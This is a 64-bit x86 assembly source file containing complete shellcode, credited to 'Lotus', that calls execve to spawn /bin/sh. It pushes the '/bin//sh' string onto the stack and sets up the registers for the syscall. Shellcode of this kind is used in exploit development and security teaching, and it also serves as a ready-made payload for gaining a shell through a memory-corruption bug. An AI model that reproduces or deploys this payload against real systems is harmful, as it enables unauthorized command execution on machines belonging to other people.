;# 	Shellcode by Lotus	#;
;# 	execve("/bin/sh")	#;
;#	64 bit arch		#;

BITS 64

;int execve(const char *pathname, char *const argv[], char *const envp[]); rax(rdi, rsi, rdx)

push byte 59
pop rax
cdq
mov rbx, 0x68732f2f6e69622f		;0x68732f2f6e69622f == "/bin//sh"
push rdx
push rbx			
push rsp
pop rdi			                ;saves pointer to "/bin//sh"
push rdx
pop rsi	
syscall
